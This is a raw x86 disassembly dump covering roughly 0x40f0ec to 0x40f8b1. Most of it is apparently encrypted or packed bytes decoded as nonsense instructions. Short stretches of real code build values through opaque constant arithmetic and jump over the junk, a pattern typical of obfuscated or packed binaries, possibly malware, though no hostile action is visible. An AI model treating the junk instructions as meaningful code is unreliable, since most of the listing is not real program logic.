  40f0ec:	sahf   
  40f0ed:	xor    eax,DWORD PTR [edx]
  40f0ef:	stc    
  40f0f0:	je     0x40f10b
  40f0f2:	das    
  40f0f3:	dec    eax
  40f0f4:	xchg   esi,eax
  40f0f5:	pop    esi
  40f0f6:	fcomi  st,st(0)
  40f0f8:	ret    
  40f0f9:	loopne 0x40f0df
  40f0fb:	mov    edx,0x5f7cec85
  40f100:	pop    ecx
  40f101:	shr    DWORD PTR [edi-0x4c2eb3a8],0xda
  40f108:	inc    edi
  40f109:	adc    edi,ebp
  40f10b:	pusha  
  40f10c:	or     DWORD PTR [ecx+0x6d],ecx
  40f10f:	nop
  40f110:	adc    al,0xe6
  40f112:	ss call 0x187d:0xe5f7374a
  40f11a:	mov    dl,0x45
  40f11c:	bound  ecx,QWORD PTR [esi]
  40f11e:	(bad)  
  40f11f:	mov    ah,0x8a
  40f121:	jae    0x40f18c
  40f123:	scas   al,BYTE PTR es:[edi]
  40f124:	xchg   edi,eax
  40f125:	sub    al,BYTE PTR ss:[edx+0x5f0e8ef]
  40f12c:	es jb  0x40f129
  40f12f:	mov    cl,BYTE PTR [esi+ecx*1-0x7c]
  40f133:	sbb    BYTE PTR [esi],ah
  40f135:	mov    DWORD PTR [eax+0x6cf6f15f],0x664d559d
  40f13f:	int    0xef
  40f141:	pop    ds
  40f142:	mov    BYTE PTR [esi],dl
  40f144:	ins    DWORD PTR es:[edi],dx
  40f145:	jge    0x40f15b
  40f147:	jae    0x40f12c
  40f149:	arpl   WORD PTR [ebp-0x4f],bx
  40f14c:	shl    DWORD PTR [ebp+0x9],1
  40f14f:	pushf  
  40f150:	xlat   BYTE PTR ds:[ebx]
  40f151:	and    al,0xd4
  40f153:	out    dx,eax
  40f154:	push   cs
  40f155:	push   eax
  40f156:	and    BYTE PTR [ebp-0x7ee3f004],ah
  40f15c:	jmp    0x6d769a7f
  40f161:	lds    ebx,FWORD PTR [esi-0x71003946]
  40f167:	xor    cl,0x2f
  40f16a:	cmp    al,BYTE PTR [esp+ecx*2]
  40f16d:	jge    0x40f0f0
  40f16f:	aam    0x51
  40f171:	(bad)  
  40f172:	stos   DWORD PTR es:[edi],eax
  40f173:	xchg   esi,eax
  40f174:	dec    eax
  40f175:	ror    bl,1
  40f177:	test   al,0x98
  40f179:	aaa    
  40f17a:	out    0x82,eax
  40f17c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f17d:	cmp    DWORD PTR [ebx-0x3c],0xd
  40f181:	adc    eax,0x2360743c
  40f186:	push   ebx
  40f187:	imul   DWORD PTR [ecx-0x4e]
  40f18a:	xchg   esi,eax
  40f18b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f18c:	mov    ecx,0xbd80bdb9
  40f191:	int3   
  40f192:	jbe    0x40f184
  40f194:	sbb    esi,DWORD PTR [ebx]
  40f196:	repnz inc edx
  40f198:	stos   BYTE PTR es:[edi],al
  40f199:	rcl    dh,0x89
  40f19c:	sti    
  40f19d:	push   ds
  40f19e:	dec    edi
  40f19f:	xchg   esp,ebp
  40f1a1:	adc    al,0x9c
  40f1a3:	cmp    ebp,DWORD PTR [edx*4-0x4107a1c5]
  40f1aa:	mov    WORD PTR [ebx],ds
  40f1ac:	ds sub al,0x34
  40f1af:	push   ebp
  40f1b0:	dec    ecx
  40f1b1:	push   0x8f5a27f2
  40f1b6:	repnz xchg edi,eax
  40f1b8:	fidivr DWORD PTR [ebp+0x6f9d592d]
  40f1be:	daa    
  40f1bf:	adc    esp,DWORD PTR [edi]
  40f1c1:	cld    
  40f1c2:	jno    0x40f213
  40f1c4:	xor    DWORD PTR [ecx+0x4d],0x7f
  40f1c8:	mov    BYTE PTR [edx+edi*8-0x5b],al
  40f1cc:	and    ah,dh
  40f1ce:	mov    eax,ds:0x4731f5f
  40f1d3:	icebp  
  40f1d4:	imul   esi,ebx,0xb3242c7e
  40f1da:	add    ebx,DWORD PTR [ebx+0x6362d633]
  40f1e0:	popa   
  40f1e1:	div    DWORD PTR [ebp+0x28]
  40f1e4:	ret    
  40f1e5:	je     0x40f1dd
  40f1e7:	pusha  
  40f1e8:	mov    cl,0x1e
  40f1ea:	pop    es
  40f1eb:	sbb    BYTE PTR [eax+0x34d08c50],al
  40f1f1:	mov    ds:0x87c21285,eax
  40f1f6:	aam    0x54
  40f1f8:	sti    
  40f1f9:	imul   ebp,DWORD PTR ss:[edi-0x7c],0x48dab17
  40f201:	mov    BYTE PTR [ebp+0x27],ch
  40f204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f205:	xchg   edi,eax
  40f206:	push   cs
  40f207:	imul   ebp,DWORD PTR [eax-0x3b],0x5d2547f4
  40f20e:	(bad)  
  40f210:	xchg   bl,ah
  40f212:	ficomp DWORD PTR [ebx+edi*1-0x60e4541e]
  40f219:	fsubr  DWORD PTR [edi+esi*1+0x79]
  40f21d:	dec    ecx
  40f21e:	lods   al,BYTE PTR ds:[esi]
  40f21f:	sbb    al,0xf1
  40f221:	pop    ss
  40f222:	and    ah,ch
  40f224:	add    al,0x7b
  40f226:	mov    DWORD PTR [ecx],0x60b9b63d
  40f22c:	inc    edi
  40f22d:	lods   eax,DWORD PTR ds:[esi]
  40f22e:	psrad  mm5,mm6
  40f231:	sbb    eax,DWORD PTR [edi-0x3d]
  40f234:	push   ds
  40f235:	rcr    BYTE PTR ds:0xf2c08025,0xbb
  40f23c:	stc    
  40f23d:	icebp  
  40f23e:	push   0xffffffdf
  40f240:	sbb    eax,0xdc611515
  40f245:	fstp   TBYTE PTR [ebp-0x18ce2933]
  40f24b:	mov    al,0x74
  40f24d:	pushf  
  40f24e:	test   al,0x78
  40f250:	jnp    0x40f207
  40f252:	push   cs
  40f253:	mov    ch,0x9d
  40f255:	jge    0x40f22b
  40f257:	sbb    edi,0x13791be5
  40f25d:	(bad)  
  40f25e:	out    0x14,al
  40f260:	add    BYTE PTR [ecx],al
  40f262:	lods   eax,DWORD PTR ds:[esi]
  40f263:	mov    cl,ah
  40f265:	jbe    0x40f220
  40f267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f268:	shl    DWORD PTR [esi+0x7e],0xe7
  40f26c:	in     eax,dx
  40f26d:	or     al,0xd0
  40f26f:	push   edi
  40f270:	cwde   
  40f271:	test   al,0xca
  40f274:	adc    BYTE PTR [edi-0x24],cl
  40f277:	loope  0x40f248
  40f279:	dec    dx
  40f27b:	add    eax,0xf776610d
  40f280:	rcl    DWORD PTR ds:0x92d995eb,cl
  40f286:	in     al,0x83
  40f288:	mov    esp,0xe8764d94
  40f28d:	in     al,0x6
  40f28f:	out    0x18,eax
  40f291:	mov    bh,0xf0
  40f293:	pop    ebx
  40f294:	jae    0x40f2ed
  40f296:	lock pop ds
  40f298:	sbb    DWORD PTR [ecx-0x4ec7b097],esi
  40f29e:	test   ebp,edi
  40f2a0:	dec    edi
  40f2a1:	and    cl,BYTE PTR [edx+0x282bea39]
  40f2a7:	cmp    cl,0x65
  40f2aa:	xchg   DWORD PTR [esi],esp
  40f2ac:	(bad)  
  40f2ad:	jecxz  0x40f25b
  40f2af:	fcom   DWORD PTR [esi+0x5e]
  40f2b2:	dec    DWORD PTR [eax]
  40f2b4:	push   ecx
  40f2b5:	ret    0xb812
  40f2b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2b9:	adc    esp,0xffffff8b
  40f2bc:	mov    ebp,0x48e9c027
  40f2c1:	jno    0x40f2fd
  40f2c3:	adc    edx,DWORD PTR [ebp-0x7f2da75e]
  40f2c9:	loopne 0x40f30b
  40f2cb:	or     eax,0xda6cff0c
  40f2d0:	inc    ecx
  40f2d1:	inc    esi
  40f2d2:	mov    eax,0x187ffbad
  40f2d7:	fst    DWORD PTR [edi-0xa]
  40f2da:	mov    eax,ds:0x8a85d97a
  40f2df:	jecxz  0x40f325
  40f2e1:	mov    al,ds:0x7152a9a7
  40f2e6:	mov    eax,ds:0x1415e40a
  40f2eb:	dec    edx
  40f2ec:	dec    edi
  40f2ed:	ins    DWORD PTR es:[edi],dx
  40f2ee:	push   esi
  40f2ef:	cli    
  40f2f0:	mov    ds:0xdb238d0c,eax
  40f2f5:	xchg   edx,eax
  40f2f6:	xor    al,0x4a
  40f2f8:	adc    bl,bl
  40f2fa:	xchg   edx,eax
  40f2fb:	cmp    edi,DWORD PTR ds:0xae511f3a
  40f301:	push   0xffffffd7
  40f303:	cmp    BYTE PTR [edi+0x73],dl
  40f306:	pop    ecx
  40f307:	daa    
  40f308:	jbe    0x40f33d
  40f30a:	repz ds sub eax,0x9a607acd
  40f311:	mov    ebx,0xd6641222
  40f316:	icebp  
  40f317:	dec    ecx
  40f318:	(bad)  
  40f319:	sbb    ebp,ebx
  40f31b:	push   ebp
  40f31c:	aaa    
  40f31d:	cmp    dl,BYTE PTR [ebx+0x804d413]
  40f323:	stos   BYTE PTR es:[edi],al
  40f324:	pusha  
  40f325:	jne    0x40f335
  40f327:	(bad)  
  40f328:	sub    al,0xe8
  40f32a:	imul   ebp,ebp,0xe807c287
  40f330:	cmp    dh,bh
  40f332:	dec    esi
  40f333:	or     esi,DWORD PTR [edx]
  40f335:	mov    ?,WORD PTR cs:[esi+0x1dcb7a69]
  40f33c:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40f33e:	(bad)  
  40f33f:	das    
  40f340:	inc    ecx
  40f341:	lahf   
  40f342:	sbb    BYTE PTR [esp+edi*8-0x16d1c2c],bh
  40f349:	rcl    BYTE PTR [ebx+esi*4+0x74],cl
  40f34d:	mov    ch,BYTE PTR [ecx-0x12]
  40f350:	pop    esi
  40f351:	pop    ebx
  40f352:	leave  
  40f353:	ret    0xc
  40f356:	push   ebp
  40f357:	mov    ebp,esp
  40f359:	sub    esp,0xec
  40f35f:	push   ebx
  40f360:	push   esi
  40f361:	mov    DWORD PTR [ebp-0x8],0x548e
  40f368:	mov    DWORD PTR [ebp-0x4],0x61c2
  40f36f:	mov    eax,DWORD PTR [ebp-0x4]
  40f372:	jmp    0x40f640
  40f377:	outs   dx,BYTE PTR ds:[esi]
  40f378:	rol    BYTE PTR [eax],cl
  40f37a:	jnp    0x40f399
  40f37c:	cmp    ch,BYTE PTR [edx-0x5e]
  40f37f:	ret    0x499f
  40f382:	push   0x56
  40f384:	test   eax,0xa82bb07f
  40f389:	sbb    BYTE PTR [eax],bl
  40f38b:	mov    esi,0xc9181814
  40f390:	pop    ds
  40f391:	mov    ch,0x2f
  40f393:	add    ebx,DWORD PTR [ebx+0x25]
  40f396:	call   0x3f8f85b3
  40f39b:	fdiv   DWORD PTR [ebx+eiz*8+0x44]
  40f39f:	dec    DWORD PTR [edx-0x68]
  40f3a2:	daa    
  40f3a3:	int    0x18
  40f3a5:	cdq    
  40f3a6:	jno    0x40f40e
  40f3a8:	jne    0x40f35b
  40f3aa:	mov    ds,ebp
  40f3ac:	mov    BYTE PTR [ebx],ch
  40f3ae:	(bad)  
  40f3af:	in     eax,0xe3
  40f3b1:	cmc    
  40f3b2:	sub    DWORD PTR [ecx-0x2d],edx
  40f3b5:	or     eax,0x78ab6265
  40f3ba:	adc    DWORD PTR [ebp+ebx*1-0x73],0x31
  40f3bf:	(bad)  
  40f3c0:	jg     0x40f34e
  40f3c2:	ins    BYTE PTR es:[edi],dx
  40f3c3:	lahf   
  40f3c4:	fsubr  QWORD PTR ss:[edx]
  40f3c7:	mov    esi,0xeeea6409
  40f3cc:	jb     0x40f41c
  40f3ce:	stos   BYTE PTR es:[edi],al
  40f3cf:	les    ebp,FWORD PTR [eax+0x57bfc2d]
  40f3d5:	pop    ebx
  40f3d6:	enter  0xdc5b,0x47
  40f3da:	arpl   WORD PTR [eax-0x5c],cx
  40f3dd:	push   ds
  40f3de:	sub    ebx,DWORD PTR [esi+edi*1-0x7f2a130e]
  40f3e5:	pop    ecx
  40f3e6:	jmp    0x40f37f
  40f3e8:	inc    ebp
  40f3e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3ea:	add    ebp,ebx
  40f3ec:	pop    es
  40f3ed:	hlt    
  40f3ee:	xchg   esp,eax
  40f3ef:	retf   
  40f3f0:	fiadd  WORD PTR [esi*1+0x3c12da24]
  40f3f7:	and    ebp,DWORD PTR [esi+eax*4-0x44f94796]
  40f3fe:	(bad)  
  40f3ff:	cld    
  40f400:	jge    0x40f46f
  40f402:	retf   0x9e7e
  40f405:	mov    dl,0x25
  40f407:	and    eax,0x83ad3351
  40f40c:	push   es
  40f40d:	pushf  
  40f40e:	mov    esp,esp
  40f410:	ins    DWORD PTR es:[edi],dx
  40f411:	xor    al,dl
  40f413:	imul   edx,DWORD PTR [esi+0x3d],0x4e543d6e
  40f41a:	repnz les esi,FWORD PTR [ebx+ebp*2+0x4d748162]
  40f422:	test   al,0xde
  40f424:	cdq    
  40f425:	gs inc ecx
  40f427:	cs sub eax,0x6394f3d0
  40f42d:	mov    ecx,0xee730a3b
  40f432:	jle    0x40f428
  40f434:	jmp    0xbe95:0x75389353
  40f43b:	jnp    0x40f428
  40f43d:	inc    edi
  40f43e:	and    esp,DWORD PTR [edx+0x39]
  40f441:	add    BYTE PTR [ebx],bh
  40f443:	mov    ah,0xf9
  40f445:	xor    esi,edx
  40f447:	push   ecx
  40f448:	xchg   esp,eax
  40f449:	push   ebx
  40f44a:	rcl    edi,0x67
  40f44d:	mov    dh,0xfa
  40f44f:	into   
  40f450:	nop
  40f451:	push   ebx
  40f452:	mov    dl,0x90
  40f454:	add    eax,0xddfa5170
  40f459:	es aas 
  40f45b:	stos   BYTE PTR es:[edi],al
  40f45c:	pop    esi
  40f45d:	add    edi,esi
  40f45f:	ins    DWORD PTR es:[edi],dx
  40f460:	pushf  
  40f461:	mov    edx,0x22b60235
  40f466:	in     al,0x7b
  40f468:	dec    esp
  40f469:	lock xchg ecx,eax
  40f46b:	mov    ?,WORD PTR [ecx]
  40f46d:	out    0xe5,al
  40f46f:	fild   QWORD PTR [edx]
  40f471:	mov    al,0x1b
  40f473:	sub    eax,0x65b57dbe
  40f478:	test   eax,0x4d3ab074
  40f47d:	inc    eax
  40f47e:	not    ch
  40f480:	inc    ebx
  40f481:	popa   
  40f482:	ret    
  40f483:	pop    eax
  40f484:	js     0x40f43b
  40f486:	pushf  
  40f487:	jl     0x40f4e8
  40f489:	push   es
  40f48a:	sub    al,0xed
  40f48c:	sbb    ch,BYTE PTR [esi]
  40f48e:	jle    0x40f422
  40f490:	aas    
  40f491:	call   0x3a2b:0x45bee6c5
  40f498:	mov    ch,ah
  40f49a:	adc    edx,ecx
  40f49c:	pop    ecx
  40f49d:	rol    BYTE PTR [ebp-0x24d03a9],cl
  40f4a3:	es cmc 
  40f4a5:	adc    bh,BYTE PTR [ebp+0x7f9031af]
  40f4ab:	outs   dx,BYTE PTR ds:[esi]
  40f4ac:	popf   
  40f4ad:	add    eax,0x19805f81
  40f4b2:	jb     0x40f456
  40f4b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4b5:	sbb    BYTE PTR [edi],bh
  40f4b7:	push   ebp
  40f4b8:	scas   al,BYTE PTR es:[edi]
  40f4b9:	xor    eax,0x48726fec
  40f4be:	std    
  40f4bf:	mov    DWORD PTR [edi+0x6f],esi
  40f4c2:	jl     0x40f480
  40f4c4:	inc    esi
  40f4c5:	or     cl,BYTE PTR [edi-0x18d7ec7c]
  40f4cb:	pushf  
  40f4cc:	xor    DWORD PTR [ecx],edi
  40f4ce:	jne    0x40f466
  40f4d0:	and    eax,0xd0204f91
  40f4d5:	pop    ds
  40f4d6:	xchg   esp,eax
  40f4d7:	xchg   edx,eax
  40f4d8:	js     0x40f48c
  40f4da:	add    DWORD PTR [edx-0x33],0xfc90973e
  40f4e1:	dec    ecx
  40f4e2:	xor    DWORD PTR [esi+0x296f8fe],edi
  40f4e8:	jo     0x40f509
  40f4ea:	fistp  DWORD PTR [ecx+0x4f]
  40f4ed:	setne  dl
  40f4f0:	sbb    edi,0xffffffb8
  40f4f3:	pop    esp
  40f4f4:	test   ecx,eax
  40f4f6:	lods   al,BYTE PTR ds:[esi]
  40f4f7:	mul    BYTE PTR [edi]
  40f4f9:	lea    ebp,[esi]
  40f4fb:	mov    cl,BYTE PTR [eax]
  40f4fd:	(bad)  
  40f4fe:	adc    al,0x58
  40f500:	cmc    
  40f501:	mov    ecx,0xa22cbe98
  40f506:	jns    0x40f56c
  40f508:	sub    bh,al
  40f50a:	(bad)  
  40f50c:	jb     0x40f4b0
  40f50e:	mov    ds:0x8b65e818,al
  40f513:	add    al,al
  40f515:	shr    BYTE PTR [edx],0x77
  40f518:	inc    eax
  40f519:	dec    ebx
  40f51a:	ret    
  40f51b:	scas   al,BYTE PTR es:[edi]
  40f51c:	push   cs
  40f51d:	sbb    BYTE PTR [eax-0xbd83d43],ah
  40f523:	out    0xd0,al
  40f525:	(bad)  [esi-0x20]
  40f528:	pop    edx
  40f529:	repnz and al,0x6
  40f52c:	cwde   
  40f52d:	xchg   esp,eax
  40f52e:	jae    0x40f54e
  40f530:	pusha  
  40f531:	mov    cl,0xc8
  40f533:	pop    ecx
  40f534:	jb     0x40f4d2
  40f536:	mov    edx,0x84df7536
  40f53b:	mul    BYTE PTR [ebp+0x1e]
  40f53e:	test   al,0x81
  40f540:	bound  ecx,QWORD PTR [edi-0x5a]
  40f543:	xchg   esp,eax
  40f544:	out    0x1d,al
  40f546:	cmp    ch,BYTE PTR [esi-0x24626ba4]
  40f54c:	and    ecx,edx
  40f54e:	mov    es,WORD PTR [ecx*4+0x5d3a9376]
  40f555:	div    BYTE PTR [ebp-0x59]
  40f558:	pop    ds
  40f559:	iret   
  40f55a:	inc    esi
  40f55b:	aas    
  40f55c:	test   al,0x79
  40f55e:	pusha  
  40f55f:	mov    esi,DWORD PTR [eax+0x1a]
  40f562:	sbb    dl,BYTE PTR [ebx]
  40f564:	jecxz  0x40f5d0
  40f566:	adc    dl,BYTE PTR [esi+0xec7f116]
  40f56c:	js     0x40f565
  40f56e:	shl    DWORD PTR [edi-0x3bf9217f],cl
  40f574:	aad    0x73
  40f576:	jb     0x40f514
  40f578:	pop    esp
  40f579:	je     0x40f533
  40f57b:	jae    0x40f56b
  40f57d:	inc    ebx
  40f57e:	cmp    BYTE PTR [eax-0x7e7b7b02],bl
  40f584:	or     eax,0x2c8ca33a
  40f589:	clc    
  40f58a:	repz pop ds
  40f58c:	jp     0x40f60b
  40f58e:	push   ss
  40f58f:	arpl   WORD PTR ds:[edi],ax
  40f592:	idiv   DWORD PTR [ebx]
  40f594:	test   BYTE PTR [ecx+0x2587a4ca],bh
  40f59a:	clc    
  40f59b:	jo     0x40f559
  40f59d:	lahf   
  40f59e:	gs iret 
  40f5a0:	inc    edx
  40f5a1:	adc    eax,0xc2a3727c
  40f5a6:	stc    
  40f5a7:	xor    DWORD PTR [ecx-0x9],edi
  40f5aa:	out    0x3f,eax
  40f5ac:	ret    0x4307
  40f5af:	or     esp,DWORD PTR [esi+0x33670cc]
  40f5b5:	xchg   BYTE PTR [edx-0x5a7ca912],ah
  40f5bb:	sub    edi,0xfffffffe
  40f5be:	xor    al,0x5b
  40f5c1:	inc    edi
  40f5c2:	adc    eax,0xaf2309ed
  40f5c7:	sub    BYTE PTR [ecx],0x6c
  40f5ca:	rcl    bh,cl
  40f5cc:	pop    edx
  40f5cd:	adc    ebx,ecx
  40f5cf:	pushf  
  40f5d0:	ficom  DWORD PTR [ebp-0x40d65600]
  40f5d6:	adc    eax,0xbc00b4bd
  40f5db:	pushf  
  40f5dc:	xor    edx,DWORD PTR [edx-0x7a55e2b8]
  40f5e2:	ins    DWORD PTR es:[edi],dx
  40f5e3:	popf   
  40f5e4:	mov    eax,ds:0x51036f4f
  40f5e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5ea:	daa    
  40f5eb:	dec    edx
  40f5ec:	pop    es
  40f5ed:	out    0x90,eax
  40f5ef:	xor    BYTE PTR [edi+edi*1+0x17],bl
  40f5f3:	fbld   TBYTE PTR ds:0x847ac01c
  40f5f9:	mov    ch,BYTE PTR cs:[edi]
  40f5fc:	sub    dh,BYTE PTR [edx+0x502bbb0e]
  40f602:	enter  0x9932,0x98
  40f606:	test   DWORD PTR [ebx+0x791eefbf],0x2de079c2
  40f610:	mov    BYTE PTR [esi+0x5cb5a06a],0x22
  40f617:	mov    bh,0x94
  40f619:	push   0x5d0437b8
  40f61e:	es jp  0x40f5dc
  40f621:	inc    esi
  40f622:	call   0xc29a70a3
  40f627:	cmc    
  40f628:	cmp    al,0x44
  40f62a:	sbb    cl,BYTE PTR [ebp-0x41]
  40f62d:	adc    bl,BYTE PTR [edi]
  40f62f:	adc    DWORD PTR [eax+eiz*8+0x2],0xffffffdf
  40f634:	cs std 
  40f636:	and    DWORD PTR [esi],ecx
  40f638:	or     eax,esi
  40f63a:	lahf   
  40f63b:	jg     0x40f5fe
  40f63d:	ins    BYTE PTR es:[edi],dx
  40f63e:	jo     0x40f611
  40f640:	mov    ecx,DWORD PTR [ebp-0x8]
  40f643:	add    eax,0x1ca5
  40f648:	or     eax,ecx
  40f64a:	mov    ecx,DWORD PTR ds:0x422538
  40f650:	lea    eax,[eax+ecx*1-0x7eef]
  40f657:	mov    DWORD PTR [ebp-0x5c],eax
  40f65a:	mov    DWORD PTR [ebp-0x4],0x8ea
  40f661:	mov    DWORD PTR [ebp-0x8],0x5759
  40f668:	mov    eax,DWORD PTR [ebp-0x8]
  40f66b:	mov    ecx,DWORD PTR [ebp-0x4]
  40f66e:	and    eax,0x27f6
  40f673:	xor    eax,ecx
  40f675:	mov    ecx,DWORD PTR ds:0x42266c
  40f67b:	imul   eax,eax,0x18
  40f67e:	xor    eax,0x17970
  40f683:	lea    eax,[ebp+eax*1-0x54]
  40f687:	mov    DWORD PTR [eax],ecx
  40f689:	mov    DWORD PTR [ebp-0x4],0x7584
  40f690:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40f697:	mov    eax,DWORD PTR [ebp-0x8]
  40f69a:	xor    edx,edx
  40f69c:	push   0x3
  40f69e:	pop    ecx
  40f69f:	div    ecx
  40f6a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6a4:	xor    edx,edx
  40f6a6:	push   0x2
  40f6a8:	add    eax,0x14d3
  40f6ad:	and    eax,ecx
  40f6af:	mov    ecx,0x6404
  40f6b4:	sub    ecx,eax
  40f6b6:	mov    DWORD PTR [ebp-0x74],ecx
  40f6b9:	mov    DWORD PTR [ebp-0xc],0x13b5
  40f6c0:	mov    DWORD PTR [ebp-0x8],0x2e54
  40f6c7:	mov    DWORD PTR [ebp-0x4],0x2f11
  40f6ce:	mov    eax,DWORD PTR [ebp-0x8]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x4]
  40f6d4:	lea    eax,[ecx+eax*1-0x65ec]
  40f6db:	mov    ecx,0x5e208
  40f6e0:	div    ecx
  40f6e2:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e5:	lea    eax,[eax+ecx*1+0x40c7]
  40f6ec:	mov    DWORD PTR [ebp-0x24],eax
  40f6ef:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40f6f6:	mov    DWORD PTR [ebp-0x8],0x16ac
  40f6fd:	mov    DWORD PTR [ebp-0xc],0x2185
  40f704:	mov    eax,DWORD PTR [ebp-0xc]
  40f707:	mov    ecx,DWORD PTR [ebp-0x8]
  40f70a:	xor    eax,0x1f75
  40f70f:	sub    eax,ecx
  40f711:	mov    ecx,DWORD PTR [ebp-0x4]
  40f714:	jmp    0x40f9e2
  40f719:	mov    ch,0xd2
  40f71b:	pop    edx
  40f71c:	mov    BYTE PTR [edx+0x20],bl
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	and    dl,BYTE PTR [edx+0x34]
  40f723:	sbb    BYTE PTR [edx-0x55180a80],ch
  40f729:	shl    DWORD PTR [edx+0x14be1818],1
  40f72f:	sbb    BYTE PTR [eax],bl
  40f731:	loopne 0x40f7a1
  40f733:	pop    ecx
  40f734:	sub    ebx,edx
  40f736:	jmp    0x9fb3:0x46a5b36b
  40f73d:	into   
  40f73e:	nop
  40f73f:	popf   
  40f740:	ret    0xc0f2
  40f743:	lea    esi,ss:[ebp+0x1c]
  40f747:	ret    0x2327
  40f74a:	fcomp  QWORD PTR [ecx-0x1f]
  40f74d:	sub    al,0x61
  40f74f:	(bad)  
  40f750:	jmp    0x40f768
  40f752:	push   ds
  40f753:	or     esp,DWORD PTR [ebx+0x4a]
  40f756:	sar    DWORD PTR [edi],cl
  40f758:	jg     0x40f72f
  40f75a:	mov    al,BYTE PTR [edx+0x74]
  40f75d:	js     0x40f724
  40f75f:	jmp    0xd12d:0x4cc63540
  40f766:	adc    dl,BYTE PTR [ebx-0x5fb517c1]
  40f76c:	jmp    0x957d:0xe8a73b0a
  40f773:	mov    edi,0xc24d1bd6
  40f778:	stos   DWORD PTR es:[edi],eax
  40f779:	mov    ebx,0xd921e636
  40f77e:	dec    ecx
  40f77f:	jmp    0x40f792
  40f781:	nop
  40f782:	pop    esi
  40f783:	loopne 0x40f7a3
  40f785:	jbe    0x40f7fb
  40f787:	pop    ds
  40f788:	jne    0x40f7df
  40f78a:	addr16 jbe 0x40f72b
  40f78d:	mov    ds:0x507ca001,al
  40f792:	stos   BYTE PTR es:[edi],al
  40f793:	test   al,0x9a
  40f795:	dec    esp
  40f796:	in     eax,0x8a
  40f798:	xchg   ecx,eax
  40f799:	pop    edx
  40f79a:	xor    BYTE PTR [edi+eax*8],ah
  40f79d:	xchg   ecx,eax
  40f79e:	sub    al,0x30
  40f7a0:	add    ch,0xe4
  40f7a3:	out    0x95,eax
  40f7a5:	js     0x40f7d2
  40f7a7:	sub    al,BYTE PTR [eax-0x3f244d58]
  40f7ad:	adc    ecx,ecx
  40f7af:	loope  0x40f7c8
  40f7b1:	les    ebx,FWORD PTR [ebx+eax*1+0x6c15bae5]
  40f7b8:	and    BYTE PTR [edi+esi*8],bl
  40f7bb:	and    al,0xf8
  40f7bd:	loope  0x40f754
  40f7bf:	test   BYTE PTR [ecx+0x48eeb382],0x89
  40f7c6:	mov    ebx,0x12d12165
  40f7cb:	and    ecx,DWORD PTR [eax+0x6]
  40f7ce:	fwait
  40f7cf:	cdq    
  40f7d0:	test   BYTE PTR [eax],0x2
  40f7d3:	jg     0x40f7a8
  40f7d5:	jg     0x40f7b0
  40f7d7:	fistp  DWORD PTR ds:0x11a83016
  40f7dd:	push   ss
  40f7de:	in     eax,0x36
  40f7e0:	cli    
  40f7e1:	pop    eax
  40f7e2:	cmp    BYTE PTR [ebx+0x4e11c069],ch
  40f7e8:	out    dx,eax
  40f7e9:	aad    0x28
  40f7eb:	scas   eax,DWORD PTR es:[edi]
  40f7ec:	xchg   edi,eax
  40f7ed:	ror    BYTE PTR [esi+0x30a4414f],0x20
  40f7f4:	mov    al,0xce
  40f7f6:	sbb    esp,ebp
  40f7f8:	shl    BYTE PTR [esi-0x48],1
  40f7fb:	jns    0x40f864
  40f7fd:	jns    0x40f77f
  40f7ff:	pusha  
  40f800:	test   al,0x14
  40f802:	and    al,0xe7
  40f804:	div    BYTE PTR [ecx+0x6e]
  40f807:	dec    ecx
  40f808:	push   0x2f
  40f80a:	push   cs
  40f80b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f80c:	mov    cs,WORD PTR [esi-0x5e33538c]
  40f812:	push   ebp
  40f813:	mov    ecx,0x7249976f
  40f818:	in     eax,0x13
  40f81a:	or     BYTE PTR [ebx-0x756e61a2],0xbc
  40f821:	daa    
  40f822:	test   al,0xbb
  40f824:	jno    0x40f88f
  40f826:	inc    ebp
  40f827:	and    esp,ebx
  40f829:	xor    edi,esi
  40f82b:	xor    esi,DWORD PTR [edx-0x65fe415a]
  40f831:	fiadd  DWORD PTR [edx]
  40f833:	dec    esp
  40f834:	pusha  
  40f835:	ds out 0x31,eax
  40f838:	mul    edi
  40f83a:	(bad)  
  40f83b:	out    0xb,al
  40f83d:	sbb    DWORD PTR [esi-0x649d9c2e],esi
  40f843:	mov    ecx,DWORD PTR [edx]
  40f845:	fisub  WORD PTR [eax+ecx*8]
  40f848:	test   DWORD PTR [eax],edx
  40f84a:	(bad)  
  40f84b:	cmp    BYTE PTR [esi-0x5b6bc0bb],al
  40f851:	or     eax,0xabeab44b
  40f856:	cld    
  40f857:	lods   al,BYTE PTR ds:[esi]
  40f858:	and    bl,BYTE PTR [ecx]
  40f85a:	(bad)  
  40f85b:	in     eax,dx
  40f85c:	inc    ecx
  40f85d:	sbb    BYTE PTR ds:0x603cf58e,dl
  40f863:	sbb    al,0x5f
  40f865:	inc    edx
  40f866:	les    ebp,FWORD PTR [edx-0x2fac1056]
  40f86c:	sar    DWORD PTR [ebx],1
  40f86e:	cwde   
  40f86f:	or     al,0xb1
  40f871:	shl    BYTE PTR [ebx+edx*8+0x51],0x6b
  40f876:	mov    ecx,0x3ccbf699
  40f87b:	pop    eax
  40f87c:	and    eax,0xd7296872
  40f881:	sub    eax,0x42fc486e
  40f886:	(bad)  
  40f887:	sar    esp,cl
  40f889:	ror    DWORD PTR [edi-0x80],cl
  40f88c:	xchg   ecx,eax
  40f88d:	pop    esi
  40f88e:	ja     0x40f872
  40f890:	pusha  
  40f891:	test   eax,0xae5b27a9
  40f896:	pop    ecx
  40f897:	(bad)  
  40f899:	lock pop ds
  40f89b:	enter  0x7ea2,0xd1
  40f89f:	mov    bh,BYTE PTR [edx+0x5b99c811]
  40f8a5:	popa   
  40f8a6:	jo     0x40f86e
  40f8a8:	sbb    edx,ecx
  40f8aa:	sub    eax,0xf411703
  40f8af:	repz pop eax
  40f8b1:	fcomp  QWORD PTR [ecx]
